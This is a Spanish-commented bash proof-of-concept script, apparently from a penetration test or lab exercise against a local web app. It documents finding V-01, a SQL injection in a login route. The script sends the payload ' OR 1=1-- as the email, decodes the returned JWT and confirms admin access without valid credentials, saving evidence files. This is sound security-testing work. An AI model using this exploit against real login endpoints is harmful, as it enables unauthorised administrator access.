#!/usr/bin/env bash
# V-01 · SQLi en login -> bypass de autenticación a admin (routes/login.ts:34)
set -uo pipefail
BASE_URL="${BASE_URL:-http://127.0.0.1:3000}"
HERE="$(cd "$(dirname "$0")" && pwd)"; EVID="${EVID:-$HERE/../../evidencias/h2-V-01-sqli-login}"; mkdir -p "$EVID"
echo "[$(TZ=America/Guatemala date '+%Y-%m-%d %H:%M:%S %Z')] V-01 SQLi login -> $BASE_URL"
printf '{"email":"%s","password":"x"}' "' OR 1=1--" > "$EVID/request.json"
HTTP=$(curl -s -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' --data @"$EVID/request.json" -o "$EVID/response.json" -w '%{http_code}')
echo "HTTP $HTTP"; echo "$HTTP" > "$EVID/http_code.txt"
TOKEN=$(python3 -c "import json;print(json.load(open('$EVID/response.json'))['authentication']['token'])" 2>/dev/null || true)
[ -z "${TOKEN:-}" ] && { echo "FAIL: sin token"; exit 1; }
python3 - "$TOKEN" > "$EVID/token-decoded.json" <<'PY'
import sys,base64,json
t=sys.argv[1];p=t.split('.')[1];p+='='*(-len(p)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))
PY
ROLE=$(python3 -c "import json;print(json.load(open('$EVID/token-decoded.json'))['data']['role'])")
EMAIL=$(python3 -c "import json;print(json.load(open('$EVID/token-decoded.json'))['data']['email'])")
echo "PASS: JWT de $EMAIL (role=$ROLE) obtenido con el payload \" ' OR 1=1-- \" y contraseña arbitraria"
[ "$ROLE" = "admin" ] && echo "VULN CONFIRMADA (V-01): autenticación como admin sin credenciales válidas"
